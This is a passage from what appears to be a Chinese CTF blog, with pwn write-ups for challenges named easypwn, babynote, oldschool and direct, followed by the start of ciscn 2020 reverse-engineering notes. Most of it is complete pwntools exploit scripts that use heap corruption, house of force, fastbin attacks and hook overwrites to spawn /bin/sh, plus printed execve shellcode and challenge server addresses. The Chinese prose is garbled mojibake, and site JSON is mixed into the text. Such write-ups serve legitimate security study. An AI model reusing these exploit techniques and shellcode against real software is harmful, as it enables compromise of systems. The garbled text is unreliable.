:io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def edit(idx,data): sla(\"&gt;&gt;\",'2') sla('idx',str(idx)) sa('name',str(data)) def show(): sla('&gt;&gt;','4') def add(): sla('&gt;&gt;','1') def add100(): sla('&gt;&gt;','3') def leave(buf): sla('&gt;&gt;','5') s(str(buf)) add() payload = '\\x00'*8 + p64(0xd41) edit(0,payload) add100() add() show() ru('1: ') libc_base = uu64(r(6)) - 0x3ec2a0 info_addr('libc',libc_base) leave(p64(libc_base + 0x3ebc30 - 0x60)) one_rec = 0x4f3c2 + libc_base edit(8,p64(one_rec)) add() itr() è¿˜æ˜¯æŒºç®€å•çš„ï¼Œæ¯”èµ›æ—¶ç«Ÿç„¶æ²¡æœ‰çœ‹è¿™ä¸ªé¢˜ã€‚ easypwnåˆ†æif ( !mallopt(1, 0) ) exit(-1); ç¦ç”¨äº†fastbinï¼ŒåŸç†å°±æ˜¯ä¿®æ”¹global_max_fast = 0x10 å­˜åœ¨off by null æ²¡æœ‰showåŠŸèƒ½ æ€è·¯ åˆ©ç”¨off by null ï¼Œä¿®æ”¹unsorted bin çš„bkä¸ºglobal_max_fast - 0x10 åˆ©ç”¨unsorted bin æ”»å‡» global_max_fast æ¥ç€fastbin attack æ‰“io fileçš„stdoutï¼Œæ³„æ¼libc æ¥ç€fastbin attackæ‰“ malloc_hook ä¸ºone gadget expfrom pwn import * import time local_file = './easypwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('39.101.184.181',10000) libc = elf.libc # libc = ELF('./libc-easypwn.so') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla('choice','1') sla('size',str(size)) def edit(idx,data): sla('choice','2') sla('idx',str(idx)) sa('tent',str(data)) def delete(idx): sla('ice','3') sla('idx',str(idx)) def leak_addr(): add(0x30) #0 add(0x98) #1 add(0xf0) #2 add(0x98) #3 add(0x40) delete(0) #null off by one edit(1,'d'*0x90 + p64(0xa0 + 0x40)) delete(2) add(0xe8 - 0x30) add(0xe8) add(0x20) delete(2) payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) +p64(0)+ p16(0x57f8- 0x10) + '\\n' edit(1,payload) add(0xe8) delete(2) payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p16(0x45cf) + '\\n' edit(1,payload) add(0xe8) add(0xe8) edit(6, 'b' * 0x41 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) + '\\n') leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() io = process('./easypwn') # io = remote('39.101.184.181',10000) continue info_addr('leak',leak) libc_addr = leak - 0x3c56a3 info_addr('libc_base',libc_addr) delete(2) edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols['_IO_2_1_stdin_'] + 143) + '\\n') add(0xe8) add(0xe8) edit(7,'\\0' * 0xe1 + p32(0xf1) + '\\n') delete(2) edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols['_IO_2_1_stdin_'] + 376) + '\\n') add(0xe8) add(0xe8) rec = libc_addr + 0xf0364 # realloc = libc_addr + libc.symbols['realloc'] + realloc[1] payload = '\\x00' * 0xa0 + p64(rec) + p64(rec) + '\\n' edit(8, payload) info_addr('libc_base',libc_addr) add(0xe8) itr() # 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # rax == NULL # 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL babynoteåˆ†æregist()strcpy(name, &amp;s); __isoc99_scanf(\"%lld\", &amp;age1); // é•¿æ•´æ•° å¯èƒ½é€ æˆæº¢å‡ºã€‚åœ¨æ ˆä¸­ï¼Œå…¶ä¸‹é¢ç´§æŒ¨ç€ageã€‚ åœ¨bssæ®µï¼Œå…¶ä¸‹é¢ç´§æŒ¨ç€heapå­˜æ”¾çš„åœ°å€ã€‚ addnote() åªèƒ½ç”³è¯·6ä¸ªå †ã€‚ ç”³è¯·äº†ä¸€ä¸ªå †ï¼Œå…¶sizeæ”¾åœ¨è·ç¦»å…¶å †åœ°å€Â·6 * 8çš„ä½ç½®ã€‚ å¯ä»¥æ ¹æ®å †åºå·ç”³è¯·å †ï¼Œåˆ¤æ–­å †åºå·æ˜¯å¦å­˜åœ¨çš„ä¾æ®ï¼šæ­¤å †å¯¹åº”çš„sizeä½æœ‰æ²¡æœ‰æ•°å€¼ï¼ˆä¹Ÿé€‚ç”¨äºshownoteï¼Œdeletenote,editnoteï¼‰deletenote() if ( v1 &lt;= 3 ) // å¯ä»¥è¾“å…¥è´Ÿæ•° &#123; if ( *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] ) &#123; free(*(void **)&amp;m[4 * (v1 + 4LL)]);// åç¼–è¯‘é”™äº† æ˜¯8 *ï¼ˆxxï¼‰ *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] = 0LL;//uaf heapæ²¡æœ‰æ¸…0,size æ¸…0 puts(\"Done!\"); &#125; å­˜åœ¨uaf åªèƒ½åˆ é™¤idx&lt;=3 çš„å † å¯ä»¥è¾“å…¥è´Ÿå †å·ï¼Œå¯ä»¥æ ¹æ®å…¶é€»è¾‘æ¥åˆ é™¤ä¸€äº›ç‰¹æ®Šçš„å † editnote()if ( v1 &lt;= 3 &amp;&amp; v1 &gt;= 0 ) åªèƒ½ç¼–è¾‘å‰4ä¸ªå † æ”»å‡»æ€è·¯ leak libc free(-1) free(-2) åˆ é™¤æ‰motto nameçš„å †å— åˆ©ç”¨resetï¼Œè°ƒç”¨registï¼Œåˆ©ç”¨strcpyæ¥æº¢å‡ºageçš„æ•°å€¼ï¼Œæ§åˆ¶ç¬¬ä¸€ä¸ªchunkçš„sizeï¼Œé€ æˆä¸€ä¸ªå †å—é‡å  åˆ é™¤0ã€1ã€2chunkï¼Œç”³è¯·ä¸€ä¸ªå¤§çš„chunkï¼Œå¯ä»¥è¦†ç›–åˆ°chunk 1çš„fdä»è€Œä¿®æ”¹ï¼Œè¿›è¡Œfastbin attack æ‰“malloc hook ä¸º one gadget expfrom pwn import * import time local_file = './babynotes' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def reg(name,motto,age): sa('name',str(name)) sa('motto',str(motto)) sla('age',str(age)) def add(idx,size): sla('&gt;&gt;','1') sla('dex',str(idx)) sla('size',str(size)) def show(idx): sla('&gt;&gt;','2') sla('dex',str(idx)) def free(idx): sla('&gt;&gt;','3') # if int(idx) &lt;=3: sla('dex',str(idx)) # if int(idx) &gt;3: # idx = def edit(idx,data): sla('&gt;&gt;','4') sla('dex',str(idx)) sa('note',str(data)) def reset(name,motto,age): sla('&gt;&gt;','5') reg(name,motto,age) name = 'a' * 0x18 motto = 'b' * 0x20 age = 0x100 reg(name,motto,age) add(0,0x58) add(1,0x68) add(2,0x68) add(3,0x100) add(4,0x18) free(3) add(5,0x68) show(5) ru('ote 5: ') libc_base = uu64(r(6)) - 0x3c4c78 info_addr('libc',libc_base) free(-1) free(-2) age = 0x1111111100000141 reset(name,' ',age) free(0) free(1) free(2) add(0,0x100) malloc_hook = 0x3c4aed + libc_base payload = 11 * p64(0) + p64(0x71) + p64(malloc_hook) edit(0,payload) add(1,0x68) add(2,0x68) add(3,0x68) one = 0xf0364 + libc_base payload = (0x13-8) * '1' + p64(0) + p64(one) edit(3,payload) free(3) itr() è¿˜æœ‰ä¸€ç§æ€è·¯ï¼Œå°±æ˜¯å› ä¸ºbssæ®µçš„ageï¼Œfreeï¼ˆ-3ï¼‰ä¹Ÿå¯ä»¥è¿›è¡Œfreeçš„ï¼Œæ§åˆ¶å…¶ä¸ºä¸€ä¸ª0x68å †å—åœ°å€çš„è¯ï¼Œå°±å¯ä»¥å‡ºç°ä¸€ä¸ª0x70çš„fastbinå—ï¼Œç„¶åå…¶sizeæ˜¯ä¸ä¼šåŒ—æŠ¹é™¤çš„ï¼Œæ‰€ä»¥åˆ©ç”¨uafç›´æ¥editå…¶fdä¸ºmalloc hookï¼Œfastbin attack æ”»å‡»å³å¯ã€‚ å¦ä¸€ç§æ‰“æ³•addnote()puts(\"Input note size: \"); __isoc99_scanf(\"%lld\", &amp;size); if ( (signed __int64)size &lt;= 0x100 ) &#123; è¿™é‡Œæœ‰ä¸ªé—æ¼ç‚¹ï¼Œaddçš„sizeæ˜¯å¯ä»¥è¾“å…¥è´Ÿçš„ house of forceä½¿ç”¨æ¡ä»¶æ¯”èµ›æ—¶æ²¡æœ‰æƒ³åˆ°ï¼Œå› ä¸ºhouse of forceç›¸å…³çš„æœ‰ç‚¹é—å¿˜äº†ã€‚ å¯ä»¥æº¢å‡ºåˆ°top chunkçš„ sizeï¼Œç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡top chunkçš„ç›¸å…³éªŒè¯ï¼Œå¸¸è§å°±æ˜¯ä¿®æ”¹ä¸º -1 å¯ä»¥ç”³è¯·ä»»æ„sizeçš„å †å—ï¼Œæ­£è´Ÿéƒ½è¡Œï¼Œä½†æ˜¯æœ‰ä¸åŒçš„æ”»å‡»é™åˆ¶ è¿™é¢˜æ˜¯å¯ä»¥æ»¡è¶³çš„: åˆ©ç”¨strcpyæ¥æº¢å‡ºageçš„æ•°å€¼ ï¼Œå¾ˆç®€å•çš„æ§åˆ¶top chunkçš„ size å¯ä»¥ç”³è¯·è´Ÿçš„å †å—ï¼Œè´Ÿçš„å †å—å¯ä»¥æ‰“heap æˆ–è€… got ï¼Œè·å–ä¸€ä¸ªä»»æ„åœ°å€å†™,é€šå¸¸åº”è¯¥éƒ½æ˜¯æ‰“heap æ”»å‡»æ€è·¯ ä¿®æ”¹top chunkçš„size åˆ©ç”¨house of forceï¼Œå°†top chunkå‘å‰ç§»åŠ¨ï¼Œä½¿å¾—å…¶ä¸ç°æœ‰çš„chunké‡åˆ ç„¶åé€šè¿‡mallocä¸€ä¸ªå°å †å—ï¼Œæ„é€ å¥½ fake chunkï¼Œæ§åˆ¶ç°æœ‰å †çš„sizeå’Œprev_sizeå_ åšunlinkï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚ exp#coding:utf8 from pwn import * sh = process('./babynotes') # sh = remote('123.56.170.202',43121) elf = ELF('./babynotes') libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') free_got = elf.got['free'] def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(sh) pause() context.terminal = ['tmux','neww'] sh.sendafter('Input your name:','haivk') sh.sendafter('Input your motto:','pwnit') sh.sendlineafter('Input your age:','1') def add(index,size): sh.sendlineafter('&gt;&gt;','1') sh.sendlineafter('Input index:',str(index)) sh.sendlineafter('Input note size:',str(size)) def show(index): sh.sendlineafter('&gt;&gt;','2') sh.sendlineafter('Input index:',str(index)) def delete(index): sh.sendlineafter('&gt;&gt;','3') sh.sendlineafter('Input index:',str(index)) def edit(index,content): sh.sendlineafter('&gt;&gt;','4') sh.sendlineafter('Input index:',str(index)) sh.sendafter('Input your note:',content) def reset(): sh.sendlineafter('&gt;&gt;','5') add(0,0x100) add(1,0x100) add(2,0x100) reset() sh.sendafter('Input your name:','haivk'.ljust(0x18,'a')) sh.sendafter('Input your motto:','pwnit') sh.sendlineafter('Input your age:','-1') add(4,-0x370) add(3,0x20) #top chunkä¸Šç§» edit(3,p64(0x100) + p64(0x110)) heap0_ptr_addr = 0x6020E0 edit(0,p64(0) + p64(0x101) + p64(heap0_ptr_addr - 0x18) + p64(heap0_ptr_addr - 0x10)) debug() #unlink delete(1) debug() edit(0,p64(0)*3 + p64(free_got)) show(0) sh.recvuntil('Note 0: ') free_addr = u64(sh.recv(6).ljust(8,'\\x00')) libc_base = free_addr - libc.sym['free'] system_addr = libc_base + libc.sym['system'] edit(0,p64(system_addr)) edit(2,'/bin/sh\\x00') #getshell delete(2) sh.interactive() exp æ¥è‡ª haivk å¤§å¸ˆå‚…ã€‚ oldschoolåˆ†æç»™äº†æºç ï¼Œåˆ†æç¨‹åºå¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ã€‚ä¼šå‘ç°å¾ˆå¤šåœ°æ–¹å¯¹sizeå¤§å°éªŒè¯ä¸æ˜¯å¾ˆå¤šï¼Œæ˜¯è´Ÿæ•°ä¹Ÿè¡Œï¼Œä½†æ˜¯å¯¹æ­¤é¢˜çš„æ”»å‡»ï¼Œç”¨é€”å¹¶ä¸å¤§ã€‚ g_ptr = mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”³è¯·çš„mmapåŒºï¼Œæ˜¯å¯ä»¥è¿›è¡Œæ‰§è¡Œçš„ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹shellcodeã€‚ æ¼æ´ç‚¹void mmap_edit()&#123; if(g_ptr == NULL)&#123; printf(\"Mmap first!\"); return; &#125; unsigned value; unsigned idx; printf(\"Index: \"); idx = get_int(); if(g_ptr + idx &lt; g_ptr &amp;&amp; (unsigned)(g_ptr + idx) &lt; ADDR_HIGH)&#123; puts(\"Invalid idx\"); return; &#125; printf(\"Value: \"); value = get_int(); g_ptr[idx] = value; &#125; å¯ä»¥çœ‹åˆ°å…¶å¯¹g_ptr + idxçš„éªŒè¯æ˜¯å¾ˆç®€å•çš„ï¼Œç»™è¶³å¤§çš„åç§»ï¼Œå¯ä»¥æ”¹åˆ°libcçš„ã€‚æ˜¯ä¸€ä¸ªæ•°ç»„æº¢å‡ºã€‚ æ”»å‡»æ€è·¯æ€è·¯1: å…ˆæ­£å¸¸åˆ†é…ï¼Œæ³„æ¼å‡ºlibcåœ°å€ åˆ†é…ä¸€ä¸‹mmapï¼Œåˆ©ç”¨æ•°ç»„æº¢å‡ºï¼Œè¿›è¡Œä¿®æ”¹malloc_hookï¼Œä¸ºmmapçš„åœ°å€ã€‚ åœ¨mmapçš„å†…å­˜ä¸Šå¡«ä¸Šshellcode æ€è·¯2: å…ˆæ­£å¸¸åˆ†é…ï¼Œæ³„æ¼å‡ºlibcåœ°å€ åˆ†é…ä¸€ä¸‹mmapï¼Œåˆ©ç”¨æ•°ç»„æº¢å‡ºï¼Œè¿›è¡Œä¿®æ”¹free_hookï¼Œä¸ºsystemã€‚ free ä¸€ä¸ª å¸¦æœ‰/bin/shçš„chunkå³å¯ è¿™ä¸ªæ›´å¥½ç‚¹ã€‚ expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size): sla('ice','1') sla('dex',str(idx)) sla('ize',str(size)) def edit(idx,data): sla('ice','2') sla('dex',str(idx)) sa('tent',str(data)) def show(idx): sla('ice','3') sla('dex',str(idx)) def free(idx): sla('ice','4') sla('dex',str(idx)) def mmap_add(addr): sla('ice','6') sla('start',str(addr)) def mmap_edit(idx,data): sla('ice','7') sla('dex',str(idx)) sla('lue',str(data)) for i in range(8): add(i,0x90) add(9,0x10) for i in range(7): free(i) free(7) add(10,0x10) show(10) ru('ent: ') libc_base = uu32(r(4)) - 0x1d8828 info_addr('libc',libc_base) system = 0x3d200 + libc_base free_hook = 0x1d98d0 + libc_base mmap_add(0) ''' # one way offset = ((libc_base+0x1d8788 - 0xe0000000)) / 4 mmap_edit(offset,'3758096384') shellcode = '\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80' shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)] for i in range(len(shellcode)): mmap_edit(i,shellcode[i]) add(13,0x10) ''' # two way offset = ((free_hook - 0xe0000000)) / 4 mmap_edit(offset,int(system)) edit(9,'/bin/sh\\x00' + '\\n') free(9) itr() directåˆ†æaddå‡½æ•° ç”³è¯·çš„chunkæœ€å¤§å€¼ä¸º0x100,maxä¸º16ä¸ª sizeå¯ä»¥ä¸ºè´Ÿå€¼ editå‡½æ•° offset, size éƒ½å¯ä»¥ä¸ºè´Ÿå€¼ read(0, (void *)(heaplist[idx] + offset), nbytes); è¿™é‡Œå­˜åœ¨è´Ÿæº¢å‡ºï¼Œå¯ä»¥ä¿®æ”¹ä¸Šä¸€ä¸ªchunké‡Œé¢çš„å€¼ open fileå‡½æ•° åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œè°ƒç”¨åå¯ä»¥è¿›è¡Œedit chunk close å‡½æ•°result = (ssize_t)readdir(dirp); v1 = result; if ( result ) &#123; put(\"Filename: \"); result = put2(v1 + 0x13); è¿›è¡Œæ‰“å°æ–‡ä»¶åã€‚ å¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹å°±æ˜¯åœ¨edité‚£é‡Œï¼Œä¸”æ²¡æœ‰showå‡½æ•°ã€‚leak libcæ˜¯æ­¤é¢˜çš„éš¾ç‚¹ã€‚å› ä¸ºæ˜¯æ²¡æœ‰putså‡½æ•°è¿›è¡Œè¾“å‡ºï¼Œæ‰€ä»¥æ”»å‡»stdoutä¹Ÿæ²¡æœ‰ç”¨ã€‚ é‡ç‚¹æ˜¯äº†è§£opendir å’Œ readdirã€‚å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/cainiao000001/article/details/80988738 å¯ä»¥å‘ç°ï¼Œåœ¨è°ƒç”¨opendirå’Œreaddiråï¼Œæ–‡ä»¶åæ˜¯å­˜åœ¨äºå†…å­˜ä¸­çš„ã€‚ç„¶åå› ä¸ºç¨‹åºçš„å†™æ³•ï¼Œä¼šç›´æ¥è¾“å‡ºä¸€ä¸‹.çš„æ–‡ä»¶åï¼Œå†æ¬¡è°ƒç”¨ä¼šè¾“å‡º..çš„æ–‡ä»¶åï¼Œä¹Ÿæ˜¯0x13çš„åç§»å¤„ã€‚é‚£ä¹ˆæƒ³åŠæ³•æº¢å‡ºä¿®æ”¹è¿™é™„è¿‘çš„å†…å­˜ï¼Œåœ¨æ‰“å°æ–‡ä»¶åçš„æ—¶å€™ï¼ŒæŠŠlibcåœ°å€ä¹Ÿç»™å°å‡ºæ¥ã€‚ æ”»å‡»æ€è·¯ å…ˆç”³è¯·8ä¸ªå †ï¼Œç„¶åé‡Šæ”¾å®Œï¼Œè®©å…¶å­˜åœ¨ä¸€ä¸ªåœ¨unsortbinçš„chunkï¼Œä¸”ç•™å‡ºä¸€ä¸ªå‡†å¤‡ä¸Šæº¢å‡ºæ”»å‡»çš„chunk openfileä¸€ä¸‹ï¼Œåœ¨heapä¸Šç”³è¯·ä¸€ä¸ªå·¨å¤§çš„chunk ä¸Šæº¢å‡ºæ”»å‡»ï¼ŒæŠŠåŠ å…¥unsortbinçš„chunkçš„sizeç»™ä¿®æ”¹å¤§ä¸€ç‚¹,è¦†ç›–åˆ°ä¸Šé¢é‚£ä¸ªå·¨å¤§çš„chunkï¼Œä¸”è¿™ä¸ªå·¨å¤§å †çš„next chunkçš„prev size è¦å¡«ä¸Šåˆé€‚çš„å¤§å°ï¼Œç»•è¿‡å¯¹unsortbin çš„æ£€æŸ¥ã€‚ closeä¸€ä¸‹ï¼Œä¼šåœ¨åˆšåˆšå·¨å¤§çš„chunkä¸­ç•™ä¸‹direntç»“æ„ä½“ï¼Œå…¶ä¸­ä¼šåŒ…å«filename ç”³è¯·å †åˆ°..è¿™ä¸ªæ–‡ä»¶åçš„é™„è¿‘ï¼Œå› ä¸ºæ˜¯unsortbinï¼Œä¼šåœ¨å…¶ä¸‹é¢ç•™ä¸‹libcåœ°å€ï¼Œå‡†å¤‡æ³„æ¼ï¼ˆè¿™ä¸ªè¦æ³¨æ„ï¼Œå°½é‡ä¸è¦ç ´ådirentç»“æ„ä½“çš„æ•°æ®ï¼Œç ´ååå®¹æ˜“æ— æ³•è¾“å‡ºfilenameï¼‰ ä¸Šæº¢æ”»å‡»..çš„æ–‡ä»¶åï¼Œç»™å…¶ä¿®æ”¹å…¶ä»–åˆé€‚çš„åå­—ï¼Œæ³„æ¼å‡ºlibcåœ°å€ å‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œä¸Šæº¢æ”»å‡»tcache chainï¼Œä¿®æ”¹ä¸ºfree hook æ”»å‡»free hook ä¸ºone gadget expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size): sla('ice','1') sla('dex',str(idx)) sla('ize',str(size)) def edit(idx,offset,size,data): sla('ice','2') sla('dex',str(idx)) sla('set',str(offset)) sla('ize',str(size)) sa('tent',str(data)) def free(idx): sla('ice','3') sla('dex',str(idx)) def openfile(): sla('ice','4') def closefile(): sla('ice','5') for i in range(8): add(i,0x100) add(8,0x18) for i in range(7): free(i) openfile() add(9,0x18) add(0,0x18) free(7) data = p64(0) + p64(0x8040 + 0x20 + 0x110) edit(8,-0x120,0x100,data) data = p64(0x8170) + p64(0x20) edit(0,-0x30,0x18,data) closefile() add(1,0x90) add(2,0x70) add(3,0x60) data = p64(0x121111111111)[:6] print(data) edit(0,-0x7fd8-0x30+2,0x8,data) closefile() ru('\\x12') libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc_base',libc_base) data = p64(0x000000000000)[:6] edit(0,-0x7fd8-0x30+2,0x8,data) free_hook = 0x3ed8e8 + libc_base one = 0x4f322 + libc_base data = '1' * 8 edit(0,-0x82a0,8,p64(free_hook)) add(4,0x100) add(5,0x100) edit(5,0,8,p64(one)) free(4) # debug() itr()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®","slug":"ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®","date":"2020-08-20T15:03:02.238Z","updated":"2020-09-24T02:19:08.778Z","comments":true,"path":"2020/08/20/ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®/","link":"","permalink":"http://chumen77.xyz/2020/08/20/ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®/","excerpt":"","text":"ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®rez3ï¿¼çœ‹èµ·æ¥åƒæ˜¯éé½æ¬¡çº¿æ€§æ–¹ç¨‹ï¼Œé‚£å°±æ˜¯å°±æ˜¯ä¸€ä¸ªè§£æ–¹ç¨‹: from numpy import * import numpy as np a = np.array([[12, 53, 6,34,58,36,1], [83,85,12,73,27,96,52], [78,53,24,36,86,25,46], [39,78,52,9,62,37,84], [23,6,14,74,48,12,83], [27,85,92,42,48,15,72], [4,6,3,67,0,26,68]]) b = np.array([[20247],[40182],[36315],[36518],[26921],[39185],[16546]]) result=[] x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[12094],[25270],[19330],[18540],[16386],[21207],[11759]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[10460],[25613],[21135],[24891],[18305],[27415],[12855]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[10899],[24927],[20670],[22926],[18006],[23345],[12602]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[12304],[26622],[19807],[22747],[14233],[24736],[10064]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[14169],[35155],[28962],[33273],[21796],[35185],[14877]]) x = np.linalg.solve(a, b) result += x.tolist() flag='' for i in result: for f in i: flag+=chr(int(f+0.5)) print(flag) hyperthreadingæ–¹æ³•ä¸€ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚ Handles = CreateThread(0, 0, StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, loc_401200, 0, 0, 0); CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0); WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF); è¿™é‡Œå¼€å§‹å¼€å¤šçº¿ç¨‹ã€‚ void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter) &#123; while ( !IsDebuggerPresent() ) ; puts((int)\"debug!\\n\"); exit(0); &#125; è¿™é‡Œé¢åˆ†åˆ«æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentã€‚ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼è¿˜æœ‰å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸ 402150 key db 0DDh,5Bh,9Eh,1Dh,20h,9Eh,90h,91h,2 dup(90h),91h .rdata:00402150 ; DATA XREF: main1+96â†‘r .rdata:00402150 db 92h,0DEh,8Bh,11h,0D1h,1Eh,9Eh,8Bh,51h,11h .rdata:00402150 db 50h,51h,8Bh,9Eh,2 dup(5Dh),11h,8Bh,90h,12h,91h .rdata:00402150 db 50h,12h,0D2h,91h,92h,1Eh,9Eh,90h,0D2h,9Fh è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚ é‚£ä¹ˆæ€è·¯å°±æ˜¯è¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¼šæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¼€å§‹æƒ³åŠæ³•å¯»æ‰¾å­—ç¬¦æ˜ å°„æ¥ç¢°æ’flagã€‚ 1 &gt; 0x92 2 &gt; 0xd2 3 &gt; 0x12 4 &gt; 0x51 5 &gt; 0x91 6 &gt; 0xd1 7 